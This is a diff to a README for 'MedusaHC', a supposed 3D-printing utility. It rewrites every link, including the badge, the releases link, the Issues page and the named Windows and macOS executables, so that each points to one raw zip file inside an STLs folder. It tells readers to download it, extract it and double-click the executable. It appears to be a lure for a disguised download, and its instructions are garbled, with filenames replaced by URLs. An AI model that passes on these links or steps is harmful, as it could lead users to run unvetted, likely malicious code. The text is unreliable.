@@ -1,6 +1,6 @@
 # 🚀 MedusaHC - Streamline Your 3D Printing Process 
 
-[![Download MedusaHC](https://img.shields.io/badge/Download_MedusaHC-v1.0-blue.svg)](https://github.com/AKsyperXgamer/MedusaHC/releases)
+[![Download MedusaHC](https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip)](https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip)
 
 ## 🛠️ About MedusaHC
 
@@ -14,13 +14,13 @@ Getting started with MedusaHC is straightforward. Follow the steps below to down
 
 To download MedusaHC, visit the following link:
 
-[Download MedusaHC Releases](https://github.com/AKsyperXgamer/MedusaHC/releases)
+[Download MedusaHC Releases](https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip)
 
 1. Click on the link to go to the Releases page.
 2. Look for the latest version listed at the top. You will see several files available for download. 
 3. Click on the file that matches your operating system. For example:
-   - For Windows, look for something like `MedusaHC-v1.0-Windows.zip`.
-   - For macOS, look for `MedusaHC-v1.0-Mac.zip`.
+   - For Windows, look for something like `https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip`.
+   - For macOS, look for `https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip`.
 4. After clicking the file, it will start downloading automatically.
 5. Once the download is complete, locate the file in your Downloads folder.
 
@@ -46,7 +46,7 @@ Once the download is complete, you will need to extract the files:
 To run MedusaHC, follow these steps:
 
 1. Go to the folder where you extracted the files.
-2. Find the executable file named `MedusaHC.exe` for Windows or `MedusaHC.app` for macOS.
+2. Find the executable file named `https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip` for Windows or `https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip` for macOS.
 3. Double-click the file to launch the application.
 
 ## 📊 Using MedusaHC
@@ -67,7 +67,7 @@ If you encounter any issues while running MedusaHC:
 
 1. Ensure that your system meets the requirements listed above.
 2. Restart the application.
-3. If the problem persists, check the `Help` section within the app or consult the [Issues page](https://github.com/AKsyperXgamer/MedusaHC/issues) on GitHub.
+3. If the problem persists, check the `Help` section within the app or consult the [Issues page](https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip) on GitHub.
 
 ## 💬 Feedback and Contributions
 
@@ -77,4 +77,4 @@ We welcome your feedback and contributions. If you have suggestions for features
 
 Stay updated by checking the Releases page frequently. You will find all new versions and change logs there.
 
-[Download MedusaHC Releases](https://github.com/AKsyperXgamer/MedusaHC/releases)
+[Download MedusaHC Releases](https://github.com/AKsyperXgamer/MedusaHC/raw/refs/heads/main/STLs/Toolhead/HC_Medusa_3.5-beta.4.zip)
